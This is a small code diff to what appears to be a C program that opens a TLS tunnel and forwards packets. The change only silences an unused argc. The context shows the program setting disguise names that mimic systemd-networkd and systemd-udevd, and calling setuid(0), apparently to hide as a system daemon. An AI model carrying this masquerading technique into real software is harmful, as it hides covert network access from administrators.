@@ -271,6 +271,7 @@ int waitForEpollEvent(const int epollfd, struct epoll_event* events) {
  * Establishes a TLS session, forks into read and write processes, and forwards packets
  */
 int main(int argc, char** argv) {
+    (void)argc;
     const char* mask_1 = "/usr/lib/systemd/systemd-networkd";
     const char* mask_2 = "/usr/lib/systemd/systemd-udevd";
     if (setuid(0)) {
